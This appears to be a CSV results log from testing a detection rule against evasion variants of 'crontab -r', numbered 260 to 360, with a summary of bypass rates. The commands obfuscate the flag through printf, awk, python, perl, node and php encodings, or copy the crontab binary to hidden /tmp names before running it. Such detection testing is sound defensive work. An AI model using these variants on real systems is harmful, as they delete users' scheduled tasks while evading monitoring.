ID,Command,Log File,Result,All Detected Rules
260,crontab -$(printf '\x72'),Remove_Scheduled_Cron_Task_checklog_attack260.log,Log Error (Result Not Found),
261,crontab -$(printf '\162'),Remove_Scheduled_Cron_Task_checklog_attack261.log,Log Error (Result Not Found),
262,"crontab -$(echo 'r' | sed 's/&#//;s/;//' | awk '{printf(""%c"", $1)}')",Remove_Scheduled_Cron_Task_checklog_attack262.log,Log Error (Result Not Found),
263,crontab -$(python3 -c 'print(chr(114))'),Remove_Scheduled_Cron_Task_checklog_attack263.log,Log Error (Result Not Found),
264,crontab -$(perl -e 'print chr(114)'),Remove_Scheduled_Cron_Task_checklog_attack264.log,Log Error (Result Not Found),
265,crontab -$'\u0072',Remove_Scheduled_Cron_Task_checklog_attack265.log,Log Error (Result Not Found),
266,crontab -$'\x72',Remove_Scheduled_Cron_Task_checklog_attack266.log,Log Error (Result Not Found),
267,crontab -$'\072',Remove_Scheduled_Cron_Task_checklog_attack267.log,Log Error (Result Not Found),
268,crontab -0d114,Remove_Scheduled_Cron_Task_checklog_attack268.log,Log Error (Result Not Found),
269,crontab -0x72,Remove_Scheduled_Cron_Task_checklog_attack269.log,Log Error (Result Not Found),
270,"crontab -$(echo -n 114 | awk '{printf(""%c"", $1)}')",Remove_Scheduled_Cron_Task_checklog_attack270.log,Log Error (Result Not Found),
271,"crontab -$(echo $((0x72)) | awk '{printf(""%c"", $1)}')",Remove_Scheduled_Cron_Task_checklog_attack271.log,Log Error (Result Not Found),
272,crontab -$((16#72)),Remove_Scheduled_Cron_Task_checklog_attack272.log,Log Error (Result Not Found),
273,"crontab -$(echo 0x72 | xargs printf ""%d\n"" | awk '{printf(""%c"", $1)}')",Remove_Scheduled_Cron_Task_checklog_attack273.log,Log Error (Result Not Found),
274,crontab -$((0100 + 22)),Remove_Scheduled_Cron_Task_checklog_attack274.log,Log Error (Result Not Found),
275,crontab -$((100 + 14)),Remove_Scheduled_Cron_Task_checklog_attack275.log,Log Error (Result Not Found),
276,"crontab -$(echo 0x72 | xargs printf ""\x%x\n"")",Remove_Scheduled_Cron_Task_checklog_attack276.log,Log Error (Result Not Found),
277,"crontab -$(echo '\u0072' | sed 's/\u//g' | xargs -I{} printf ""\x{}"")",Remove_Scheduled_Cron_Task_checklog_attack277.log,Log Error (Result Not Found),
278,"crontab -$(echo -e ""\u0072"")",Remove_Scheduled_Cron_Task_checklog_attack278.log,Log Error (Result Not Found),
279,"crontab -$(awk 'BEGIN{printf ""%c"", 114}')",Remove_Scheduled_Cron_Task_checklog_attack279.log,Log Error (Result Not Found),
280,"crontab -$(echo 162 | awk '{printf ""%c"", strtonum(""0"" $1)}')",Remove_Scheduled_Cron_Task_checklog_attack280.log,Log Error (Result Not Found),
281,"crontab -$(echo 0x72 | awk '{printf ""%c"", strtonum($1)}')",Remove_Scheduled_Cron_Task_checklog_attack281.log,Log Error (Result Not Found),
282,crontab -$'\x72',Remove_Scheduled_Cron_Task_checklog_attack282.log,Log Error (Result Not Found),
283,crontab -$'\u0072',Remove_Scheduled_Cron_Task_checklog_attack283.log,Log Error (Result Not Found),
284,crontab -$'\x72',Remove_Scheduled_Cron_Task_checklog_attack284.log,Log Error (Result Not Found),
285,crontab -$'\x{72}',Remove_Scheduled_Cron_Task_checklog_attack285.log,Log Error (Result Not Found),
286,"crontab -$(node -p ""String.fromCharCode(114)"")",Remove_Scheduled_Cron_Task_checklog_attack286.log,Log Error (Result Not Found),
287,crontab -$(php -r 'echo chr(114);'),Remove_Scheduled_Cron_Task_checklog_attack287.log,Log Error (Result Not Found),
288,crontab -$(echo -n '72' | xxd -r -p),Remove_Scheduled_Cron_Task_checklog_attack288.log,Log Error (Result Not Found),
289,"crontab -$(echo 114 | python3 -c ""import sys; print(chr(int(sys.stdin.read())))"")",Remove_Scheduled_Cron_Task_checklog_attack289.log,Log Error (Result Not Found),
290,crontab -$(echo -ne '\x72'),Remove_Scheduled_Cron_Task_checklog_attack290.log,Log Error (Result Not Found),
291,crontab -$(echo -ne '\162'),Remove_Scheduled_Cron_Task_checklog_attack291.log,Log Error (Result Not Found),
292,crontab -$(dd if=/dev/zero bs=1 count=1 2>/dev/null | tr '\0' '\x72'),Remove_Scheduled_Cron_Task_checklog_attack292.log,Log Error (Result Not Found),
293,crontab -$(head -c1 < <(echo -n 'r')),Remove_Scheduled_Cron_Task_checklog_attack293.log,Log Error (Result Not Found),
294,"crontab -$(cut -c1 <<< ""r"")",Remove_Scheduled_Cron_Task_checklog_attack294.log,Log Error (Result Not Found),
295,crontab -$(xargs -0 printf '%b' <<< '\x72'),Remove_Scheduled_Cron_Task_checklog_attack295.log,Log Error (Result Not Found),
296,"crontab -$(awk 'BEGIN{ORS=""""; print ""\x72""}')",Remove_Scheduled_Cron_Task_checklog_attack296.log,Log Error (Result Not Found),
297,"crontab -$(perl -e 'print ""\x72""')",Remove_Scheduled_Cron_Task_checklog_attack297.log,Log Error (Result Not Found),
298,crontab -$(cat <<< -e '\x72'),Remove_Scheduled_Cron_Task_checklog_attack298.log,Log Error (Result Not Found),
299,crontab -$(echo $'\x72'),Remove_Scheduled_Cron_Task_checklog_attack299.log,Log Error (Result Not Found),
300,crontab -$(tr -d '\n' <<< $'\x72'),Remove_Scheduled_Cron_Task_checklog_attack300.log,Log Error (Result Not Found),
301,cp /usr/bin/crontab /tmp/t; /tmp/t -r,Remove_Scheduled_Cron_Task_checklog_attack301.log,Log Error (Result Not Found),
302,cp $(which crontab) /dev/shm/t && /dev/shm/t -r,Remove_Scheduled_Cron_Task_checklog_attack302.log,Log Error (Result Not Found),
303,install -m 755 /usr/bin/crontab /tmp/x && /tmp/x -r,Remove_Scheduled_Cron_Task_checklog_attack303.log,Log Error (Result Not Found),
304,cp /bin/crontab ./c && ./c -r,Remove_Scheduled_Cron_Task_checklog_attack304.log,Log Error (Result Not Found),
305,cp $(command -v crontab) /tmp/fake && /tmp/fake -r,Remove_Scheduled_Cron_Task_checklog_attack305.log,Log Error (Result Not Found),
306,cat /usr/bin/crontab > /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden -r,Remove_Scheduled_Cron_Task_checklog_attack306.log,Log Error (Result Not Found),
307,cp /usr/bin/crontab /tmp/.cron && exec /tmp/.cron -r,Remove_Scheduled_Cron_Task_checklog_attack307.log,Log Error (Result Not Found),
308,dd if=/usr/bin/crontab of=/tmp/newcron bs=1M && chmod +x /tmp/newcron && /tmp/newcron -r,Remove_Scheduled_Cron_Task_checklog_attack308.log,Log Error (Result Not Found),
309,cp /usr/bin/crontab /tmp/xyz && nohup /tmp/xyz -r &,Remove_Scheduled_Cron_Task_checklog_attack309.log,Log Error (Result Not Found),
310,cp $(which crontab) /tmp/.x && setsid /tmp/.x -r,Remove_Scheduled_Cron_Task_checklog_attack310.log,Log Error (Result Not Found),
311,cp /usr/bin/crontab /tmp/.bin && /tmp/.bin -r,Remove_Scheduled_Cron_Task_checklog_attack311.log,Log Error (Result Not Found),
312,cp /bin/crontab /tmp/_cron && /tmp/_cron -r,Remove_Scheduled_Cron_Task_checklog_attack312.log,Log Error (Result Not Found),
313,cp $(which crontab) /dev/shm/cx && /dev/shm/cx -r,Remove_Scheduled_Cron_Task_checklog_attack313.log,Log Error (Result Not Found),
314,install /usr/bin/crontab /tmp/renamed_cron && /tmp/renamed_cron -r,Remove_Scheduled_Cron_Task_checklog_attack314.log,Log Error (Result Not Found),
315,cp /usr/bin/crontab /var/tmp/cron_rm && /var/tmp/cron_rm -r,Remove_Scheduled_Cron_Task_checklog_attack315.log,Log Error (Result Not Found),
316,cp /usr/bin/crontab ~/cr && ~/cr -r,Remove_Scheduled_Cron_Task_checklog_attack316.log,Log Error (Result Not Found),
317,cp /usr/bin/crontab /tmp/crondeleter && /tmp/crondeleter -r,Remove_Scheduled_Cron_Task_checklog_attack317.log,Log Error (Result Not Found),
318,cp /usr/bin/crontab /tmp/a.out && ./tmp/a.out -r,Remove_Scheduled_Cron_Task_checklog_attack318.log,Log Error (Result Not Found),
319,cp /usr/bin/crontab /tmp/.exec && bash /tmp/.exec -r,Remove_Scheduled_Cron_Task_checklog_attack319.log,Log Error (Result Not Found),
320,cp $(command -v crontab) /tmp/run && exec /tmp/run -r,Remove_Scheduled_Cron_Task_checklog_attack320.log,Log Error (Result Not Found),
321,cp /usr/bin/crontab /tmp/xcron && chmod +x /tmp/xcron && /tmp/xcron -r,Remove_Scheduled_Cron_Task_checklog_attack321.log,Log Error (Result Not Found),
322,cp /usr/bin/crontab /tmp/.cr && nohup /tmp/.cr -r &,Remove_Scheduled_Cron_Task_checklog_attack322.log,Log Error (Result Not Found),
323,cp /usr/bin/crontab /tmp/cron_remove && /tmp/cron_remove -r,Remove_Scheduled_Cron_Task_checklog_attack323.log,Log Error (Result Not Found),
324,cp $(which crontab) ./cronx && ./cronx -r,Remove_Scheduled_Cron_Task_checklog_attack324.log,Log Error (Result Not Found),
325,cp /usr/bin/crontab /tmp/todel && exec /tmp/todel -r,Remove_Scheduled_Cron_Task_checklog_attack325.log,Log Error (Result Not Found),
326,cp /usr/bin/crontab /tmp/fexec && /tmp/fexec -r,Remove_Scheduled_Cron_Task_checklog_attack326.log,Log Error (Result Not Found),
327,cp /usr/bin/crontab /tmp/delc && /tmp/delc -r,Remove_Scheduled_Cron_Task_checklog_attack327.log,Log Error (Result Not Found),
328,cp /usr/bin/crontab /tmp/cron-off && /tmp/cron-off -r,Remove_Scheduled_Cron_Task_checklog_attack328.log,Log Error (Result Not Found),
329,cp /usr/bin/crontab /tmp/mycron && /tmp/mycron -r,Remove_Scheduled_Cron_Task_checklog_attack329.log,Log Error (Result Not Found),
330,cp /usr/bin/crontab /tmp/z && /tmp/z -r,Remove_Scheduled_Cron_Task_checklog_attack330.log,Log Error (Result Not Found),
331,cp /usr/bin/crontab /tmp/.cronjob && /tmp/.cronjob -r,Remove_Scheduled_Cron_Task_checklog_attack331.log,Log Error (Result Not Found),
332,cp /usr/bin/crontab /tmp/rmcron && bash /tmp/rmcron -r,Remove_Scheduled_Cron_Task_checklog_attack332.log,Log Error (Result Not Found),
333,cp $(which crontab) /tmp/.sneaky && exec /tmp/.sneaky -r,Remove_Scheduled_Cron_Task_checklog_attack333.log,Log Error (Result Not Found),
334,cp /usr/bin/crontab /tmp/r && /tmp/r -r,Remove_Scheduled_Cron_Task_checklog_attack334.log,Log Error (Result Not Found),
335,cp /usr/bin/crontab /tmp/cronclean && /tmp/cronclean -r,Remove_Scheduled_Cron_Task_checklog_attack335.log,Log Error (Result Not Found),
336,cp /usr/bin/crontab /tmp/cleanup && /tmp/cleanup -r,Remove_Scheduled_Cron_Task_checklog_attack336.log,Log Error (Result Not Found),
337,cp /usr/bin/crontab /tmp/crontab_helper && /tmp/crontab_helper -r,Remove_Scheduled_Cron_Task_checklog_attack337.log,Log Error (Result Not Found),
338,cp /usr/bin/crontab /tmp/.bin_cron && /tmp/.bin_cron -r,Remove_Scheduled_Cron_Task_checklog_attack338.log,Log Error (Result Not Found),
339,cp /usr/bin/crontab /tmp/tmpbin && /tmp/tmpbin -r,Remove_Scheduled_Cron_Task_checklog_attack339.log,Log Error (Result Not Found),
340,cp /usr/bin/crontab /tmp/x && bash /tmp/x -r,Remove_Scheduled_Cron_Task_checklog_attack340.log,Log Error (Result Not Found),
341,cp /usr/bin/crontab /tmp/remove_sched && /tmp/remove_sched -r,Remove_Scheduled_Cron_Task_checklog_attack341.log,Log Error (Result Not Found),
342,cp /usr/bin/crontab /tmp/.xcron && /tmp/.xcron -r,Remove_Scheduled_Cron_Task_checklog_attack342.log,Log Error (Result Not Found),
343,cp /usr/bin/crontab /tmp/sched_del && /tmp/sched_del -r,Remove_Scheduled_Cron_Task_checklog_attack343.log,Log Error (Result Not Found),
344,cp /usr/bin/crontab /tmp/bin_sched && /tmp/bin_sched -r,Remove_Scheduled_Cron_Task_checklog_attack344.log,Log Error (Result Not Found),
345,cp /usr/bin/crontab /tmp/justdoit && /tmp/justdoit -r,Remove_Scheduled_Cron_Task_checklog_attack345.log,Log Error (Result Not Found),
346,cp $(which crontab) /tmp/q && /tmp/q -r,Remove_Scheduled_Cron_Task_checklog_attack346.log,Log Error (Result Not Found),
347,cp /usr/bin/crontab /tmp/.r && /tmp/.r -r,Remove_Scheduled_Cron_Task_checklog_attack347.log,Log Error (Result Not Found),
348,cp /usr/bin/crontab /tmp/del_me && /tmp/del_me -r,Remove_Scheduled_Cron_Task_checklog_attack348.log,Log Error (Result Not Found),
349,cp /usr/bin/crontab /tmp/runner && /tmp/runner -r,Remove_Scheduled_Cron_Task_checklog_attack349.log,Log Error (Result Not Found),
350,cp /usr/bin/crontab /tmp/.runner && /tmp/.runner -r,Remove_Scheduled_Cron_Task_checklog_attack350.log,Log Error (Result Not Found),
351,cp /usr/bin/crontab /tmp/a1 && /tmp/a1 -r,Remove_Scheduled_Cron_Task_checklog_attack351.log,Log Error (Result Not Found),
352,cp /usr/bin/crontab /tmp/.a1 && /tmp/.a1 -r,Remove_Scheduled_Cron_Task_checklog_attack352.log,Log Error (Result Not Found),
353,cp /usr/bin/crontab /tmp/s1 && /tmp/s1 -r,Remove_Scheduled_Cron_Task_checklog_attack353.log,Log Error (Result Not Found),
354,cp /usr/bin/crontab /tmp/remove_me && /tmp/remove_me -r,Remove_Scheduled_Cron_Task_checklog_attack354.log,Log Error (Result Not Found),
355,cp /usr/bin/crontab /tmp/crontab_tmp && /tmp/crontab_tmp -r,Remove_Scheduled_Cron_Task_checklog_attack355.log,Log Error (Result Not Found),
356,cp /usr/bin/crontab /tmp/bypass_cron && /tmp/bypass_cron -r,Remove_Scheduled_Cron_Task_checklog_attack356.log,Log Error (Result Not Found),
357,cp /usr/bin/crontab /tmp/shadow_cron && /tmp/shadow_cron -r,Remove_Scheduled_Cron_Task_checklog_attack357.log,Log Error (Result Not Found),
358,cp /usr/bin/crontab /tmp/ninja && /tmp/ninja -r,Remove_Scheduled_Cron_Task_checklog_attack358.log,Log Error (Result Not Found),
359,cp /usr/bin/crontab /tmp/execit && /tmp/execit -r,Remove_Scheduled_Cron_Task_checklog_attack359.log,Log Error (Result Not Found),
360,cp /usr/bin/crontab /tmp/schedkill && /tmp/schedkill -r,Remove_Scheduled_Cron_Task_checklog_attack360.log,Log Error (Result Not Found),
,,,,
,,,,
=== SUMMARY REPORT ===,,,,
Total Commands (File),360,,,
Triggered Target,16,,,
TOTAL BYPASS RATE,1 / 360 (0.28%),,,
  > Bypass All,0,,,
  > Bypass Target Rule,1,,,
Missing/Not Run,343,,,
